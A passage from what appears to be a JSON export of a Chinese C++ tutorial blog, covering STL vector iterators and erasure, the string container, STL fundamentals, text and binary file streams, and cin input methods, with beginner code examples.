it++, ++it, it–, --it，*it， itA = itB， itA == itB，itA != itB ​ 其中list,set,multiset,map,multimap支持双向迭代器。 随机访问迭代器支持的操作： 在双向迭代器的操作基础上添加 it+=i， it-=i， it+i(或it=it+i)，it[i], itA&lt;itB, itA&lt;=itB, itA&gt;itB, itA&gt;=itB 的功能。 ​ 其中vector，deque支持随机访问迭代器。 10vector与迭代器的配合使用 12345678910111213vector&lt;int&gt; vecInt; //假设包含1,3,5,7,9元素vector&lt;int&gt;::iterator it; //声明容器vector&lt;int&gt;的迭代器。it = vecInt.begin(); // *it == 1++it; //或者it++; *it == 3 ，前++的效率比后++的效率高，前++返回引用，后++返回值。it += 2; //*it == 7it = it+1; //*it == 9++it; // it == vecInt.end(); 此时不能再执行*it,会出错! 正向遍历： 12345for(vector&lt;int&gt;::iterator it=vecInt.begin(); it!=vecInt.end(); ++it)&#123; int iItem = *it; cout &lt;&lt; iItem; //或直接使用 cout &lt;&lt; *it;&#125; 逆向遍历： 1234567for(vector&lt;int&gt;::reverse_iterator rit=vecInt.rbegin(); rit!=vecInt.rend(); ++rit) //注意，小括号内仍是++rit&#123; int iItem = *rit; cout &lt;&lt; iItem; //或直接使用cout &lt;&lt; *rit;&#125;此时将打印出9,7,5,3,1注意，这里迭代器的声明采用vector&lt;int&gt;::reverse_iterator，而非vector&lt;int&gt;::iterator。 迭代器还有其它两种声明方法： 1vector&lt;int&gt;::const_iterator 与 vector&lt;int&gt;::const_reverse_iterator 以上两种分别是vector&lt;int&gt;::iterator 与vector&lt;int&gt;::reverse_iterator 的只读形式，使用这两种迭代器时，不会修改到容器中的值。 备注：不过容器中的insert和erase方法仅接受这四种类型中的iterator，其它三种不支持。《Effective STL》建议我们尽量使用iterator取代const_iterator、reverse_iterator和const_reverse_iterator。 11vector的插入 123vector.insert(pos,elem); //在pos位置插入一个elem元素的拷贝，返回新数据的位置。vector.insert(pos,n,elem); //在pos位置插入n个elem数据，无返回值。vector.insert(pos,beg,end); //在pos位置插入[beg,end)区间的数据，无返回值 12345678910111213141516171819简单案例vector&lt;int&gt; vecA; vector&lt;int&gt; vecB; vecA.push_back(1); vecA.push_back(3); vecA.push_back(5); vecA.push_back(7); vecA.push_back(9); vecB.push_back(2); vecB.push_back(4); vecB.push_back(6); vecB.push_back(8); vecA.insert(vecA.begin(), 11); //&#123;11, 1, 3, 5, 7, 9&#125; vecA.insert(vecA.begin()+1,2,33); //&#123;11,33,33,1,3,5,7,9&#125; vecA.insert(vecA.begin() , vecB.begin() , vecB.end() ); //&#123;2,4,6,8,11,33,33,1,3,5,7,9&#125; 12vector的删除 1234理论知识vector.clear(); //移除容器的所有数据vec.erase(beg,end); //删除[beg,end)区间的数据，返回下一个数据的位置。vec.erase(pos); //删除pos位置的数据，返回下一个数据的位置。 123456789101112131415161718192021222324简单案例:删除区间内的元素vecInt是用vector&lt;int&gt;声明的容器，现已包含按顺序的1,3,5,6,9元素。vector&lt;int&gt;::iterator itBegin=vecInt.begin()+1;vector&lt;int&gt;::iterator itEnd=vecInt.begin()+2;vecInt.erase(itBegin,itEnd);//此时容器vecInt包含按顺序的1,6,9三个元素。假设 vecInt 包含1,3,2,3,3,3,4,3,5,3，删除容器中等于3的元素for(vector&lt;int&gt;::iterator it=vecInt.being(); it!=vecInt.end(); ) //小括号里不需写 ++it&#123; if(*it == 3) &#123; it = vecInt.erase(it); //以迭代器为参数，删除元素3，并把数据删除后的下一个元素位置返回给迭代器。 //此时，不执行 ++it； &#125; else &#123; ++it; &#125;&#125;//删除vecInt的所有元素vecInt.clear(); //容器为空 巧用swap收缩vector空间容量 12345678910111213141516171819202122232425262728#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;void test01() &#123; vector&lt;int&gt; vi; vi.resize(100,1); vi.reserve(1000); cout &lt;&lt; \"size: \" &lt;&lt; vi.size() &lt;&lt; endl; cout &lt;&lt; \"cap: \" &lt;&lt; vi.capacity() &lt;&lt; endl; cout &lt;&lt; \"=================================\" &lt;&lt; endl; vector&lt;int&gt;(vi).swap(vi); //先创建一个匿名对象,用vi的元素个数初始化,然后交换vi的ptr指针 cout &lt;&lt; \"size: \" &lt;&lt; vi.size() &lt;&lt; endl; cout &lt;&lt; \"cap: \" &lt;&lt; vi.capacity() &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125; reserve预留空间提高程序效率 123456789101112131415161718192021222324252627282930313233343536#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;void test02() &#123; vector&lt;int&gt; vi; int * pAddress = NULL; int num = 0; vi.reserve(100000); //如果提前知道了数据的个数,可以提前设置好容量的大小,避免频繁改动内存 for (int i = 0; i &lt; 100000; i++) &#123; vi.push_back(i); if (pAddress != &amp;vi[0]) &#123; pAddress = &amp;vi[0]; num++; &#125; &#125; cout.setf(ios::left); cout &lt;&lt;\"vi的内存变动了\" &lt;&lt; num &lt;&lt; \"次\" &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test02(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"STL的string容器","slug":"cpp0078-STL的string容器","date":"2021-06-29T04:18:51.000Z","updated":"2021-07-05T03:38:07.546Z","comments":true,"path":"2021/06/29/cpp0078-STL的string容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/29/cpp0078-STL的string容器/","excerpt":"","text":"STL的string容器 1String概念 string是STL的字符串类型，通常用来表示字符串。而在使用string之前，字符串通常是用char表示的。string与char都可以用来表示字符串，那么二者有什么区别呢。 string和char*的比较 string是一个类, char*是一个指向字符的指针。 string封装了char*，管理这个字符串，是一个char*型的容器。 string不用考虑内存释放和越界。 string管理char*所分配的内存。每一次string的复制，取值都由string类负责维护，不用担心复制越界和取值越界等。 string提供了一系列的字符串操作函数（这个等下会详讲） 查找find，拷贝copy，删除erase，替换replace，插入insert 2string的构造函数 默认构造函数： 1string(); //构造一个空的字符串string s1。 拷贝构造函数： 1string(const string &amp;str); //构造一个与str一样的string。如string s1(s2)。 带参数的构造函数 123string(const char *s); //用字符串s初始化string(int n,char c); //用n个字符c初始化 3string的存取字符操作 string类的字符操作： 1234567const char &amp;operator[] (int n) const;const char &amp;at(int n) const;char &amp;operator[] (int n);char &amp;at(int n); operator[]和at()均返回当前字符串中第n个字符，但二者是有区别的。 ​ 主要区别在于at()在越界时会抛出异常，[]在刚好越界时会返回(char)0，再继续越界时，编译器直接出错。如果你的程序希望可以通过try,catch捕获异常，建议采用at()。 4从string取得const char*的操作 1const char *c_str() const; //返回一个以&apos;\\0&apos;结尾的字符串的首地址 5把string拷贝到char*指向的内存空间的操作 1int copy(char *s, int n, int pos=0) const; 把当前串中以pos开始的n个字符拷贝到以s为起始位置的字符数组中，返回实际拷贝的数目。注意要保证s所指向的空间足够大以容纳当前字符串，不然会越界。 6string的长度 12int length() const; //返回当前字符串的长度。长度不包括字符串结尾的&apos;\\0&apos;。bool empty() const; //当前字符串是否为空 7string的赋值 1234567891011string &amp;operator=(const string &amp;s);//把字符串s赋给当前的字符串string &amp;assign(const char *s); //把字符串s赋给当前的字符串string &amp;assign(const char *s, int n); //把字符串s的前n个字符赋给当前的字符串string &amp;assign(const string &amp;s); //把字符串s赋给当前字符串string &amp;assign(int n,char c); //用n个字符c赋给当前字符串string &amp;assign(const string &amp;s,int start, int n); //把字符串s中从start开始的n个字符赋给当前字符串 8string字符串连接 12345678910111213string &amp;operator+=(const string &amp;s); //把字符串s连接到当前字符串结尾string &amp;operator+=(const char *s);//把字符串s连接到当前字符串结尾string &amp;append(const char *s); //把字符串s连接到当前字符串结尾string &amp;append(const char *s,int n); //把字符串s的前n个字符连接到当前字符串结尾string &amp;append(const string &amp;s); //同operator+=()string &amp;append(const string &amp;s,int pos, int n);//把字符串s中从pos开始的n个字符连接到当前字符串结尾string &amp;append(int n, char c); //在当前字符串结尾添加n个字符c 9string的比较 12int compare(const string &amp;s) const; //与字符串s比较int compare(const char *s) const; //与字符串s比较 compare函数在&gt;时返回 1，&lt;时返回 -1，==时返回 0。比较区分大小写，比较时参考字典顺序，排越前面的越小。大写的A比小写的a小。 10string的子串 1string substr(int pos=0, int n=npos) const; //返回由pos开始的n个字符组成的子字符串 11string的查找 和 替换 查找 1234567891011121314int find(char c,int pos=0) const; //从pos开始查找字符c在当前字符串的位置 int find(const char *s, int pos=0) const; //从pos开始查找字符串s在当前字符串的位置int find(const string &amp;s, int pos=0) const; //从pos开始查找字符串s在当前字符串中的位置find函数如果查找不到，就返回-1int rfind(char c, int pos=npos) const; //从pos开始从后向前查找字符c在当前字符串中的位置 int rfind(const char *s, int pos=npos) const;int rfind(const string &amp;s, int pos=npos) const;//rfind是反向查找的意思，如果查找不到， 返回-1 替换 12345string &amp;replace(int pos, int n, const char *s);//删除从pos开始的n个字符，然后在pos处插入串sstring &amp;replace(int pos, int n, const string &amp;s); //删除从pos开始的n个字符，然后在pos处插入串svoid swap(string &amp;s2); //交换当前字符串与s2的值 12String的区间删除和插入 123456string &amp;insert(int pos, const char *s);string &amp;insert(int pos, const string &amp;s);//前两个函数在pos位置插入字符串sstring &amp;insert(int pos, int n, char c); //在pos位置 插入n个字符cstring &amp;erase(int pos=0, int n=npos); //删除pos开始的n个字符，返回修改后的字符串 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;//char* 和 string转换void test01()&#123; //string类型转换为char*字符串 string s = \"abc\"; const char* str = s.c_str(); //char*类型字符串转换为string类型字符串 char* str2 = \"acbd\"; string s2(str2);&#125;//string初始化void test02()&#123; string s; //默认构造 string s2 = \"acbd\"; string s3(s2); string s4(10, 'c'); cout &lt;&lt; s2 &lt;&lt; endl; cout &lt;&lt; s3 &lt;&lt; endl; cout &lt;&lt; s4 &lt;&lt; endl;&#125;//string容器字符串赋值和存取void test03()&#123; //string容器赋值 string s; s = \"abcd\"; string s2; s2.assign(\"pppp\"); //string容器存取 string s3 = \"abcdefg\"; for (int i = 0; i &lt; s3.size();i++)&#123; cout &lt;&lt; s3[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; for (int i = 0; i &lt; s3.size();i++)&#123; cout &lt;&lt; s3.at(i) &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //【】访问方式访问越界时候，不会抛异常，直接挂掉 //at会抛出异常 try&#123; //cout &lt;&lt; s3[100] &lt;&lt; endl; cout &lt;&lt; s3.at(100) &lt;&lt; endl; &#125; catch (...)&#123; cout &lt;&lt; \"访问越界!\" &lt;&lt; endl; &#125;&#125;//string容器拼接操作void test04()&#123; string s1 = \"aaa\"; string s2 = \"bbb\"; //string s3 = s1 + s2; //cout &lt;&lt; s3 &lt;&lt; endl; //s1 += s2; //cout &lt;&lt; s1 &lt;&lt; endl; //成员方法方式 append s1.append(s2); cout &lt;&lt; s1 &lt;&lt; endl;&#125;//string查找和替换 比较void test05()&#123; string s = \" acbdefg\"; //查找 string target = \"bd\"; int pos = s.find(target); char* target2 = \"ef\"; int pos2 = s.find(target2); cout &lt;&lt; \"pos:\" &lt;&lt; pos &lt;&lt; endl; cout &lt;&lt; \"pos2:\" &lt;&lt; pos2 &lt;&lt; endl; int pos3 = s.rfind(target); cout &lt;&lt; \"pos3:\" &lt;&lt; pos3 &lt;&lt; endl; //字符串替换 string s1 = \"acbd\"; s.replace(0, 2, s1); cout &lt;&lt; s &lt;&lt; endl; &#125;//string 比较 子串 插入和删除void test06()&#123; //比较 string s1 = \"abc\"; string s2 = \"abd\"; int ret = s1.compare(s2); if (ret == 1)&#123; cout &lt;&lt; \"s1 &gt; s2\" &lt;&lt; endl; &#125; else if (ret == -1)&#123; cout &lt;&lt; \"s1 &lt; s2\" &lt;&lt; endl; &#125; else&#123; cout &lt;&lt; \"s1 == s2\" &lt;&lt; endl; &#125; //子串 string s3 = \"abcdefg\"; string s4 = s3.substr(0,2); cout &lt;&lt; \"s4\" &lt;&lt; s4 &lt;&lt; endl; //插入和删除 string s5 = \"abcd\"; s5.insert(0, \"pppp\"); string s6 = \"qqqq\"; s5.insert(s5.size(), s6); cout &lt;&lt; s5 &lt;&lt; endl; s5.erase(0,4); cout &lt;&lt; s5 &lt;&lt; endl; &#125;int main()&#123; //test02(); //test03(); //test04(); //test05(); test06(); system(\"pause\"); return EXIT_SUCCESS;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"STL基础理论","slug":"cpp0077-STL基础理论","date":"2021-06-29T03:39:14.000Z","updated":"2021-06-29T03:56:38.103Z","comments":true,"path":"2021/06/29/cpp0077-STL基础理论/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/29/cpp0077-STL基础理论/","excerpt":"","text":"STL实用技术专题 STL(标准模板库)理论基础 基本概念 STL（Standard Template Library，标准模板库)是惠普实验室开发的一系列软件的统称。现然主要出现在C中，但在被引入C之前该技术就已经存在了很长的一段时间。 STL的从广义上讲分为三类：algorithm（算法）、container（容器）和iterator（迭代器），容器和算法通过迭代器可以进行无缝地连接。几乎所有的代码都采 用了模板类和模板函数的方式，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会。在C++标准中，STL被组织为下面的13个头文 件：&lt;algorithm&gt;、&lt;deque&gt;、&lt;functional&gt;、&lt;iterator&gt;、&lt;vector&gt;、&lt;list&gt;、&lt;map&gt;、&lt;memory&gt;、&lt;numeric&gt;、&lt;queue&gt;、&lt;set&gt;、&lt;stack&gt; 和&lt;utility&gt;。 ​ STL详细的说六大组件 – 容器（Container） – 算法（Algorithm） – 迭代器（Iterator） – 仿函数（Function object） – 适配器（Adaptor） – 空间配制器（allocator） 使用STL的好处 1）STL是C++的一部分，因此不用额外安装什么，它被内建在你的编译器之内。 2）STL的一个重要特点是数据结构和算法的分离。尽管这是个简单的概念，但是这种分离确实使得STL变得非常通用。 例如，在STL的vector容器中，可以放入元素、基础数据类型变量、元素的地址； STL的sort()函数可以用来操作vector,list等容器。 1） 程序员可以不用思考STL具体的实现过程，只要能够熟练使用STL就OK了。这样他们就可以把精力放在程序开发的别的方面。 2） STL具有高可重用性，高性能，高移植性，跨平台的优点。 高可重用性：STL中几乎所有的代码都采用了模板类和模版函数的方式实现，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会。关于模板的知识，已经给大家介绍了。 高性能：如map可以高效地从十万条记录里面查找出指定的记录，因为map是采用红黑树的变体实现的。(红黑树是平横二叉树的一种) 高移植性：如在项目A上用STL编写的模块，可以直接移植到项目B上。 ​ 跨平台：如用windows的Visual Studio编写的代码可以在Mac OS的XCode上直接编译。 3） 程序员可以不用思考STL具体的实现过程，只要能够熟练使用STL就OK了。这样他们就可以把精力放在程序开发的别的方面。 4） 了解到STL的这些好处，我们知道STL无疑是最值得C程序员骄傲的一部分。每一个C＋＋程序员都应该好好学习STL。只有能够熟练使用STL的程序员，才是好的C程序员。 5） 总之：招聘工作中，经常遇到C程序员对STL不是非常了解。大多是有一个大致的映像，而对于在什么情况下应该使用哪个容器和算法都感到比较茫然。STL是C程序员的一项不可或缺的基本技能，掌握它对提升C++编程大有裨益。 容器 在实际的开发过程中，数据结构本身的重要性不会逊于操作于数据结构的算法的重要性，当程序中存在着对时间要求很高的部分时，数据结构的选择就显得更加重要。 经典的数据结构数量有限，但是我们常常重复着一些为了实现向量、链表等结构而编写的代码，这些代码都十分相似，只是为了适应不同数据的变化而在 细节上有所出入。STL容器就为我们提供了这样的方便，它允许我们重复利用已有的实现构造自己的特定类型下的数据结构，通过设置一些模板，STL容器对最常用的数据结构提供了支持，这些模板的参数允许我们指定容器中元素的数据类型，可以将我们许多重复而乏味的工作简化。 容器部分主要由头文 件&lt;vector&gt;,&lt;list&gt;,&lt;deque&gt;,&lt;set&gt;,&lt;map&gt;,&lt;stack&gt; 和&lt;queue&gt;组成。对于常用的一些容器和容器适配器（可以看作由其它容器实现的容器），可以通过下表总结一下它们和相应头文件的对应关系。 容器的概念 用来管理一组元素 容器的分类 序列式容器（Sequence containers） 每个元素都有固定位置－－取决于插入时机和地点，和元素值无关。 vector、deque、list 关联式容器（Associated containers） 元素位置取决于特定的排序准则，和插入顺序无关 set、multiset、map、multimap 迭代器 迭代器从作用上来说是最基本的部分，可是理解起来比前两者都要费力一些。软件设计有一个基本原则，所有的问题都可以通过引进一个间接层来简化， 这种简化在STL中就是用迭代器来完成的。概括来说，迭代器在STL中用来将算法和容器联系起来，起着一种黏和剂的作用。几乎STL提供的所有算法都是通 过迭代器存取元素序列进行工作的，每一个容器都定义了其本身所专有的迭代器，用以存取容器中的元素。 迭代器部分主要由头文件&lt;utility&gt;,&lt;iterator&gt;和&lt;memory&gt;组 成。&lt;utility&gt;是一个很小的头文件，它包括了贯穿使用在STL中的几个模板的声明，&lt;iterator&gt;中提供了迭代器 使用的许多方法，而对于&lt;memory&gt;的描述则十分的困难，它以不同寻常的方式为容器中的元素分配存储空间，同时也为某些算法执行期间产生 的临时对象提供机制,&lt;memory&gt;中的主要部分是模板类allocator，它负责产生所有容器中的默认分配器。 算法 函数库对数据类型的选择对其可重用性起着至关重要的作用。举例来说，一个求方根的函数，在使用浮点数作为其参数类型的情况下的可重用性肯定比使 用整型作为它的参数类性要高。而C++通过模板的机制允许推迟对某些类型的选择，直到真正想使用模板或者说对模板进行特化的时候，STL就利用了这一点提 供了相当多的有用算法。它是在一个有效的框架中完成这些算法的——可以将所有的类型划分为少数的几类，然后就可以在模版的参数中使用一种类型替换掉同一种 类中的其他类型。 STL提供了大约100个实现算法的模版函数，比如算法for_each将为指定序列中的每一个元素调用指定的函数，stable_sort以 你所指定的规则对序列进行稳定性排序等等。这样一来，只要熟悉了STL之后，许多代码可以被大大的化简，只需要通过调用一两个算法模板，就可以完成所需要 的功能并大大地提升效率。 算法部分主要由头文件&lt;algorithm&gt;，&lt;numeric&gt;和&lt;functional&gt;组 成。&lt;algorithm&gt;是所有STL头文件中最大的一个（尽管它很好理解），它是由一大堆模版函数组成的，可以认为每个函数在很大程度上 都是独立的，其中常用到的功能范围涉及到比较、交换、查找、遍历操作、复制、修改、移除、反转、排序、合并等等。&lt;numeric&gt;体积很 小，只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。&lt;functional&gt;中则定义了一些模板类， 用以声明函数对象。 C++标准库 C强大的功能来源于其丰富的类库及库函数资源。C标准库的内容总共在50个标准头文件中定义。在C++开发中，要尽可能地利用标准库完 成。这样做的直接好处包括：（1）成本：已经作为标准提供，何苦再花费时间、人力重新开发呢；（2）质量：标准库的都是经过严格测试的，正确性有保证； （3）效率：关于人的效率已经体现在成本中了，关于代码的执行效率要相信实现标准库的大牛们的水平；（4）良好的编程风格：采用行业中普遍的做法进行开发。 在C++程序设计课程中，尤其是作为第一门程序设计课程，我们注重了语法、语言的机制等方面的内容。程序设计能力的培养有个过程，跨过基本的原 理性知识直接进入到工程 中的普遍做法，由于跨度决定了其难度。再者，在掌握了基本原理的基础上，在认识标准库的问题上完全可以凭借实践，逐步地掌握。标准 库的学习不需要认认真真地读书，需要的是在了解概貌的情况下，在实践中深入。 这个任务就是要知道C++程序设计课程中不讲的，但对程序设计又很重要的这部分内容。至少我们要能先回答出“有什么”的问题。 C++标准库的内容分为10类，分别是（建议在阅读中，将你已经用过或听说过的头文件划出来）： C1. 标准库中与语言支持功能相关的头文件 C2. 支持流输入/输出的头文件 C标准库的所有头文件都没有扩展名。C标准库以&lt;cname&gt;形式的标准头文件提供。在 &lt;cname&gt;形式标准的头文件中，与宏相关的名称在全局作用域中定义，其他名称在std命名空间中声明。在C++中还可以使用name.h 形式的标准C库头文件名","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"文件操作","slug":"cpp0076-文件操作","date":"2021-06-29T01:27:59.000Z","updated":"2021-06-29T02:56:37.698Z","comments":true,"path":"2021/06/29/cpp0076-文件操作/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/29/cpp0076-文件操作/","excerpt":"","text":"文本文件操作 ifstream类，它是从istream类派生的，用来支持从磁盘文件的输入。 ofstream类，它是从ostream类派生的，用来支持向磁盘文件的输出。 fstream类，它是从iostream类派生的，用来支持对磁盘文件的输入输出。 文件的打开与关闭 打开文件 所谓打开(open)文件是一种形象的说法，如同打开房门就可以进入房间活 动一样。 打开文件是指在文件读写之前做必要的准备工作，包括： 1）为文件流对象和指定的磁盘文件建立关联，以便使文件流流向指定的磁盘 文件。 2）指定文件的工作方式，如，该文件是作为输入文件还是输出文件，是ASCII 文件还是二进制文件等。 以上工作可以通过两种不同的方法实现。 调用文件流的成员函数open。如 ofstream outfile; //定义ofstream类(输出文件流类)对象outfile outfile.open(“f1.dat”,ios::out); //使文件流与f1.dat文件建立关联 第2行是调用输出文件流的成员函数open打开磁盘文件f1.dat，并指定它为输出 文件， 文件流对象ouFile将向磁盘文件f1.dat输出数据。ios::out是I/O模式的一 种，表示以输出方式打开一个文件。或者简单地说，此时f1.dat是一个输出文 件，接收从内存输出的数据。 调用成员函数open的一般形式为： 文件流对象.open(磁盘文件名, 输入输出方式); 磁盘文件名可以包括路径，如&quot;c:\\new\\f1.dat&quot;，如缺省路径，则默认为当 前目录下的文件。 在定义文件流对象时指定参数 在声明文件流类时定义了带参数的构造函数，其中包含了打开磁盘文件 的功能。因此，可以在定义文件流对象时指定参数，调用文件流类的构造函数 几点说明： 新版本的I/O类库中不提供ios::nocreate和ios::noreplace。 每一个打开的文件都有一个文件指针，该指针的初始位置由I/O方式指定， 每次读写都从文件指针的当前位置开始。每读入一个字节，指针就后移一个字 节。当文 件指针移到最后，就会遇到文件结束EOF（文件结束符也占一个字节， 其值为-1)，此时流对象的成员函数eof的值为非0值(一般设为1)，表示文件结 束 了。 可以用“位或”运算符“|”对输入输出方式进行组合，如表13.6中最后3行 所示那样。还可以举出下面一些例子： ios::in | ios:: noreplace //打开一个输入文件，若文件不存在则返回打开失 败的信息 ios::app | ios::nocreate //打开一个输出文件，在文件尾接着写数据，若文件不存在，则返回打开失败的信息 ios::out l ios::noreplace //打开一个新文件作为输出文件，如果文件已存 在则返回打开失败的信息 ios::in l ios::out I ios::binary //打开一个二进制文件，可读可写 但不能组合互相排斥的方式，如 ios::nocreate l ios::noreplace。 如果打开操作失败，open函数的返回值为0(假)，如果是用调用构造函数的 方式打开文件的，则流对象的值为0。可以据此测试打开是否成功。如 if(outfile.open(“f1.bat”, ios::app) ==0) cout &lt;&lt;“open error”; 或 if( !outfile.open(“f1.bat”, ios::app) ) cout &lt;&lt;“open error”; 关闭文件 在对已打开的磁盘文件的读写操作完成后，应关闭该文件。关闭文件用 成员函数close。如 ouFile.close(); //将输出文件流所关联的磁盘文件关闭 所谓关闭，实际上是解除该磁盘文件与文件流的关联，原来设置的工作方式也 失效，这样，就不能再通过文件流对该文件进行输入或输出。此时可以将文件 流与其他磁盘文件建立关联，通过文件流对新的文件进行输入或输出。如 ouFile.open(“f2.dat”,ios::app|ios::nocreate); 此时文件流ouFile与f2.dat建立关联，并指定了f2.dat的工作方式。 C++对ASCII文件的读写操作 如果文件的每一个字节中均以ASCII代码形式存放数据,即一个字节存放一 个字符,这个文件就是ASCII文件(或称字符文件)。程序可以从ASCII文件中读入若 干个字符,也可以向它输出一些字符。 用流插入运算符&lt;&lt;和流提取运算符&gt;&gt;输入输出标准类型的数据。&lt;&lt; 和&gt;&gt;都已在iostream中被重载为能用于ostream和istream类对象的标准类型的 输入输出。由于ifstream和 ofstream分别是ostream和istream类的派生类；因此 它们从ostream和istream类继承了公用的重载函数，所以在对磁盘文件的操作 中，可以通过文件流对象和流插入运算符&lt;&lt;及 流提取运算符&gt;&gt;实现对磁盘 文件的读写，如同用cin、cout和&lt;&lt;、&gt;&gt;对标准设备进行读写一样。 用文件流的put、get、geiline等成员函数进行字符的输入输出，：用C++ 流成员函数put输出单个字符、C++ get()函数读入一个字符和C++ getline()函数读 入一行字符。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;fstream&gt;using namespace std;void test01() &#123; char sourceFileName[] = \"source.txt\"; char destFileName[] = \"dest.txt\"; //方式1 //用构造函数打开文件 //ifstream fin(sourceFileName,ios::in); //打开输入文件 //ofstream fout(destFileName,ios::out); //打开输出文件 //方式2 ifstream fin; ofstream fout; fin.open(sourceFileName,ios::in); //以写追加模式打开文件 fout.open(destFileName,ios::out | ios::app); //判断文件是否打开成功 //这里 if (!fin || !fout) &#123; cout &lt;&lt; \"打开文件失败\" &lt;&lt; endl; return; &#125; char ch; while (fin.get(ch)) &#123; fout &lt;&lt; ch; //fout.put(ch); //输出一个字符到文件里 &#125; //关闭文件 fin.close(); fout.close();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125; C++对二进制文件的读写操作 文本模式 在linux系统平台下是以\\n作为换行符的 在windows系统平台下是以\\r\\n作为换行符 文本模式和二进制模式在Linux下是不区分的,但在windows模式下是区分的,因为windows模式下的换行符\\r\\n要进行转换 二进制模式 不进行编码转换,将内存中的内容原封不动的输出到文件或将内容原封不动的输入到内存中 1.用ios::binary模式打开文件 2.以二进制方式写到文件 ​ 对象名.write(地址,要写入的字节大小) 3.以二进制方式读到内存 ​ 对象名.read(地址,要读入的字节大小) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;fstream&gt;using namespace std;class Person &#123;public: Person() &#123; m_Age = 0; strcpy(m_Name,\"\"); &#125; Person(const char * name, int age) &#123; m_Age = age; strcpy(m_Name, name); &#125; void show() &#123; cout &lt;&lt; m_Name &lt;&lt; \" \" &lt;&lt; m_Age &lt;&lt; endl; &#125; int m_Age; char m_Name[50];&#125;;void test01() &#123; Person p1(\"小明\", 18); Person p2(\"小花\", 16); char fileName[] = \"binary.txt\"; //以二进制方式打开文件 ofstream fout(fileName, ios::out | ios::binary); ifstream fin(fileName, ios::in | ios::binary); if (!fin || !fout) &#123; cout &lt;&lt; \"文件打开失败\" &lt;&lt; endl; return; &#125; //写二进制文件,首位参数需要转换类型为char * fout.write((char *) &amp;p1,sizeof(p1)); fout.write((char *) &amp;p2,sizeof(p2)); fout.close(); Person tP1, tP2; //读二进制文件,首位参数需要转换类型为char * fin.read((char *)&amp;tP1,sizeof(tP1)); fin.read((char *)&amp;tP2,sizeof(tP2)); //显示输出 tP1.show(); tP2.show(); fin.close();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"标准输入输出","slug":"cpp0075-标准输入输出","date":"2021-06-28T04:14:14.000Z","updated":"2021-06-29T03:45:06.289Z","comments":true,"path":"2021/06/28/cpp0075-标准输入输出/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/28/cpp0075-标准输入输出/","excerpt":"","text":"标准输入输出 缓冲区 1234567有缓冲区的输入输出对象cout //标准输出cin //标准输入clog //打印日志没有缓冲区的输出对象cerr //标准出错 标准输入流 常用的cin成员方法 12345678910111213141516ch 代表字符变量buff 代表字符数组size代表字符数组长度cin.get() //一次只能读取一个字符cin.get(ch) //读一个字符cin.get(buff,size) //可以读字符串cin.getline(buff,size)//输入一行cin.ignore() //从缓冲区取走一个字符并丢弃cin.ignore(2) //从缓冲区取走2个字符并丢弃cin.ignore(2,&apos;\\n&apos;) //从缓冲区取走2个字符并丢弃,遇到\\n提前结束cin.peek();//偷窥缓冲区内容,返回缓冲区第一个字符,不取走字符cin.putback(ch) //把ch放回缓冲区 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//cin的operator&gt;&gt;操作符 //根据回车来刷新缓冲区 根据空格来隔离每个变量的内容void test1()&#123; int myInt; long myLong; char buf[128] = &#123; 0 &#125;; cin &gt;&gt; myInt; cin &gt;&gt; myLong; cin &gt;&gt; buf; cout &lt;&lt; \"myInt: \" &lt;&lt; myInt &lt;&lt; endl; cout &lt;&lt; \"myLong: \" &lt;&lt; myLong &lt;&lt; endl; cout &lt;&lt; \"buf: \" &lt;&lt; buf &lt;&lt; endl;&#125;//cin.get()方法void test2()&#123; char ch; //cin.get()如果读到的不是EOF标识符，那么会永远的阻塞等待 //从键盘来讲ctrl+z 代表EOF标识符 while ((ch = cin.get() )!= EOF) &#123; cout &lt;&lt; ch &lt;&lt; endl; &#125;&#125;void test3()&#123; char a, b, c; char buf[10] = &#123; 0 &#125;; cout &lt;&lt; \"从输入缓冲区去读取数据，如果缓冲区中没有数据，就阻塞\" &lt;&lt; endl; //cin.get(a); //从输入缓冲区去读取数据，如果有就给a //cin.get(b); //cin.get(c); //cin.get(a).get(b).get(c); //cout &lt;&lt; \"a =\" &lt;&lt; a &lt;&lt; endl; //cout &lt;&lt; \"b =\" &lt;&lt; b&lt;&lt; endl; //cout &lt;&lt; \"c =\" &lt;&lt; c&lt;&lt; endl; cin.get(buf, 10, ' '); cout &lt;&lt; buf &lt;&lt; endl;&#125;//cin.getline()void test4()&#123; char buf[128] = 